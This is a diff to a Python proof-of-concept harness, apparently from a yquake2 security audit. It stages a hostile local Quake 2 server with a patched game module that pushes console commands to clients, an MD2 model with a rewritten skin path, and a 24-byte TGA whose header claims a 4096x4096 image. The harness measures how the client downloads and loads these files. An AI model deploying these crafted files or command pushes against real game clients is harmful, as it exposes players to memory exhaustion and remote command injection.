@@ -1,26 +1,52 @@
 #!/usr/bin/env python3
-"""R27 AJ1.0 / AJ1.4: the hostile-server download route, exercised.
+"""R27 AJ1.0 / AK2: the hostile-server download route, exercised.
 
 Proves the download reach the premise cites (sv_user.c:437-451,
 cl_download.c:212-222 skin names, cl_parse.c:1413-1417 stufftext)
-end to end on the local machine:
+end to end on the local machine.  Everything the drill needs is
+built by --prepare; the rest of this docstring says what actually
+selects what.
 
-  server: q2ded from the gate build, HOME=--srchome, -game evilmod
-    (a scratch copy-built game module that precaches one extra
-    model), game dir holds models/evil/tris.md2 (v_blast with one
-    skin name rewritten to a textures/*.tga path) and a tiny TGA
-    under that name.
-  client: the release host, HOME=--clihome (fresh), same -game,
-    +connect localhost:<port>.  r_retexturing default 1.
+  server: q2ded from the gate build, HOME=--srchome, -cfgdir sgame,
+    default game baseq2.  There is NO `-game evilmod`: the patched
+    module is selected by landing at srchome/sgame/baseq2/game.dylib
+    (the engine dlopens game.dylib from the gamedir).  The srchome
+    game dir also holds models/evil/tris.md2 (v_blast with skin0
+    renamed to a textures/*.tga path that exists nowhere else),
+    that TGA, and maps b_dl1 (a byte-copy of base1 under a name the
+    client lacks) + b_dl2 (base1 with the e1u1/metal2_1 texinfo
+    renamed by mkbsp.py).
+  client: the release host, HOME=--clihome, -cfgdir hgame,
+    +connect localhost:<port>.  r_retexturing default 1, downloads
+    land in hgame/baseq2 (= FS_Gamedir()).
 
-The server's stdin is a pipe: --stuff lines run as `stuff <id> <cmd>`
-server-console commands - the svc_stufftext shape (a server sending
-`set <cvar> <v>` to the client).  Samples client RSS at 0.5 s,
-timestamps banner/first-r_speeds-frame off the client qconsole.log.
+Server-console control is raw stdin (--srv-cmd at t+5s, --srv-cmd2
+at t+25s; this engine registers `map` but has NO `stuff` or
+`changelevel` console command).  The svc_stufftext shape (a server
+pushing console commands at one client - what the AJ1 lifecycle
+drill needs) is produced by the PATCHED MODULE: ClientBegin
+unicasts svc_stufftext ("set r_stb_budget 2048\nvid_restart") once
+per game process when a client enters b_dl1.  The patch is
+evilmod.patch (against yquake2 9dbf6992; applied to a COPY,
+--yq2 never modified); --prepare copy-builds it with `make game`.
 
-usage:
-  python3 dlroute.py --srchome DIR --clihome DIR [--port 28001]
-      [--wait 45] [--stuff "set r_stb_budget 0"]... [--keep]
+Note the exists-gate the drill demonstrates in reverse (round-28
+AK1): CL_DownloadFilter skips names already on the client's search
+path (yquake2 cl_download.c:600), so the hostile names must be
+names the client LACKS - pre-stage them and the downloads stop.
+`--dev` on the client shows loader Com_DPrintf lines, including
+"LoadSTB() loaded:" for the network-supplied TGA.
+
+usage (cold, from a clean checkout):
+  python3 dlroute.py --prepare \
+      [--yq2 PATH --datadir PATH] \
+      --srchome DIR --clihome DIR [--port 28001] [--wait 60]
+  # then, or in the same invocation (order above):
+  python3 dlroute.py --srchome DIR --clihome DIR --srvmap base1 \
+      --srv-cmd "map b_dl2" --dev
+
+--prepare builds the module (a few tens of seconds).  It wipes
+--srchome and --clihome first.
 """
 import argparse
 import hashlib
@@ -30,33 +56,125 @@ import subprocess
 import sys
 import time
 
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+import mkbsp  # noqa: E402  (pak_extract + the map mutators live there)
+
 HOST = "/Volumes/Scratch/dev/quake2/yquake2/build-sdl3/release/quake2"
 Q2DED = "/Volumes/Scratch/dev/quake2/yquake2/build-sdl3/release/q2ded"
 DATADIR = "/Volumes/Scratch/dev/quake2/Quake 2.app/Contents/Resources"
+YQ2 = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                   os.pardir, os.pardir, os.pardir, "yquake2")
 
 
 def sha1(p):
     return hashlib.sha1(open(p, "rb").read()).hexdigest()
 
 
+EVIL_MODEL = "models/evil/tris.md2"
+EVIL_SKIN = "textures/e1u1/r27evil_tex.tga"
+
+
+def evil_md2(datadir):
+    """v_blast's tris.md2 with the FIRST skin name rewritten to the
+    TGA path (64-byte field at ofs_skins).  The MD2 header's
+    ofs_skins/num_skins stay valid, so the client's precache walk
+    reads the name straight out of the downloaded model header
+    (cl_download.c:212-222) and asks the server for it."""
+    buf = bytearray(mkbsp.pak_extract(datadir, "models/weapons/v_blast/tris.md2"))
+    # header = 4-byte ident + 16 ints: version..num_frames then
+    # ofs_skins, so ofs_skins is the 10th int after the ident
+    # (offset 44); the 11th is ofs_st.
+    ofs_skins = int.from_bytes(buf[4 + 4 * 10:4 + 4 * 11], "little")
+    name = EVIL_SKIN.encode() + b"\0"
+    buf[ofs_skins:ofs_skins + 64] = name.ljust(64, b"\0")
+    # (byte-clear the whole 64-byte field: matches the round-27
+    # artifact byte-for-byte, sha1 19c7af9d2d13cd31e41d0f6b4b1ee8db60a188aa)
+    return bytes(buf)
+
+
+def evil_tga():
+    """24 bytes: an 18-byte TGA header claiming a 4096x4096 8-bit
+    RLE image (stbi_info parses it; that is the 64 MB canvas claim
+    the budget meters) followed by three 2-byte RLE packets - far
+    short of the 16.7 M pixels.  Kept byte-for-byte identical to the
+    round-27 artifact (sha1 81b14a60dbaee1aaca2d0867d3ba9782983630cb)
+    so the report's quoted numbers stay checkable."""
+    hdr = (b"\x00\x00\x0a" + b"\x00" * 9 +
+           (4096).to_bytes(2, "little") + (4096).to_bytes(2, "little") +
+           b"\x08\x00")
+    return hdr + b"\xff\x42" * 3
+
+
+def prepare(a):
+    """Build the whole staging from a clean checkout: patched game
+    module (copy-built), evil MD2, 24-byte TGA, b_dl1 + b_dl2."""
+    for d in (a.srchome, a.clihome):
+        shutil.rmtree(d, ignore_errors=True)
+    gd = os.path.join(a.srchome, "sgame", "baseq2")
+    for sub in ("maps", "models/evil", "textures/e1u1"):
+        os.makedirs(os.path.join(gd, sub), exist_ok=True)
+    os.makedirs(os.path.join(a.clihome, "hgame"), exist_ok=True)
+
+    build = os.path.join(a.srchome, "evilmod-build")
+    shutil.copytree(a.yq2, build,
+                    ignore=shutil.ignore_patterns(".git", "build",
+                                                  "debug", "release"))
+    p = subprocess.run(["patch", "-p1", "-i",
+                        os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                     "evilmod.patch")],
+                       cwd=build, capture_output=True, text=True)
+    if p.returncode != 0:
+        sys.exit("evilmod.patch did not apply (yquake2 source at %s "
+                 "must sit at 9dbf6992; patch said:\n%s" % (a.yq2,
+                                                            p.stderr))
+    p = subprocess.run(["make", "game"], cwd=build,
+                       capture_output=True, text=True)
+    if p.returncode != 0:
+        sys.exit("make game failed in %s:\n%s" % (build, p.stdout[-2000:]))
+    shutil.copy(os.path.join(build, "release", "baseq2", "game.dylib"),
+                os.path.join(gd, "game.dylib"))
+
+    open(os.path.join(gd, EVIL_MODEL), "wb").write(evil_md2(a.datadir))
+    open(os.path.join(gd, EVIL_SKIN), "wb").write(evil_tga())
+    # b_dl2 (renamed texinfo) out of the committed mkbsp.py mutators;
+    # b_dl1 (for the module's stufftext leg) is a byte-copy of base1
+    # under a name the client lacks, so the map download gates the walk.
+    subprocess.run([sys.executable,
+                    os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                 "mkbsp.py"),
+                    "--datadir", a.datadir, "--out",
+                    os.path.join(a.srchome, "sgame")],
+                   check=True, capture_output=True)
+    open(os.path.join(gd, "maps", "b_dl1.bsp"), "wb").write(
+        mkbsp.pak_extract(a.datadir, "maps/base1.bsp"))
+    print("prepare: module, %s, %s, maps b_dl1+b_dl2 staged under %s"
+          % (EVIL_MODEL, EVIL_SKIN, gd))
+    print("prepare: evil md2 sha1=%s evil tga sha1=%s"
+          % (sha1(os.path.join(gd, EVIL_MODEL)),
+             sha1(os.path.join(gd, EVIL_SKIN))))
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--srchome", required=True)
     ap.add_argument("--clihome", required=True)
+    ap.add_argument("--prepare", action="store_true",
+                    help="build all staging from this checkout first "
+                         "(wipes --srchome/--clihome)")
+    ap.add_argument("--yq2", default=os.path.abspath(YQ2),
+                    help="yquake2 source tree (read-only; a copy is "
+                         "built). default: ../../../yquake2")
+    ap.add_argument("--datadir", default=DATADIR)
     ap.add_argument("--port", type=int, default=28001)
     ap.add_argument("--srvmap", default="base1",
                     help="server map; a map the client lacks makes the "
                          "map download gate the whole precache walk")
     ap.add_argument("--wait", type=int, default=45)
-    ap.add_argument("--stuff", action="append", default=[],
-                    help="server-console 'stuff 0 <cmd>' at t+5s")
     ap.add_argument("--srv-cmd", action="append", default=[],
                     help="raw server-console command at t+5s "
-                         "(e.g. 'changelevel base1')")
+                         "(e.g. 'map b_dl2')")
     ap.add_argument("--srv-cmd2", action="append", default=[],
                     help="raw server-console command at t+25s")
-    ap.add_argument("--stuff2", action="append", default=[],
-                    help="server-console 'stuff 0 <cmd>' at t+40s")
     ap.add_argument("--freshcli", action="store_true",
                     help="wipe the client HOME first")
     ap.add_argument("--dev", action="store_true",
@@ -64,6 +182,9 @@ def main():
                          "Com_DPrintf lines (LoadSTB() loaded: ...)")
     ap.add_argument("--keep", action="store_true")
     a = ap.parse_args()
+
+    if a.prepare:
+        prepare(a)
 
     if a.freshcli:
         shutil.rmtree(a.clihome, ignore_errors=True)
@@ -110,11 +231,9 @@ def main():
         except Exception:
             pass
         if not stuffed and time.time() - t0 > 5:
-            for s in a.stuff:
-                srv.stdin.write(("stuff 0 %s\n" % s).encode())
             for c in a.srv_cmd:
                 srv.stdin.write((c + "\n").encode())
-            if a.stuff or a.srv_cmd:
+            if a.srv_cmd:
                 srv.stdin.flush()
             stuffed = True
         if not stuffed2 and a.srv_cmd2 and time.time() - t0 > 25:
